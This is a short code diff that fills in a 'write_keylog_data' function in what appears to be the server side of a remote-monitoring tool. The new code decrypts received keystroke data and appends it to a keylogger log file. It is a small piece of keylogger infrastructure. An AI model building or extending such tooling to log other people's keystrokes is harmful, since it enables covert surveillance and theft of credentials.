@@ -91,7 +91,10 @@ def subprocess_packet_handler(pkt):
 
 
 def write_keylog_data(data):
-    pass
+    b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
+    msg = b.decode("utf-8")
+    with open("logs/keylogger.log", "a") as f:
+        f.write(msg)
 
 
 def write_monitor_data(data):
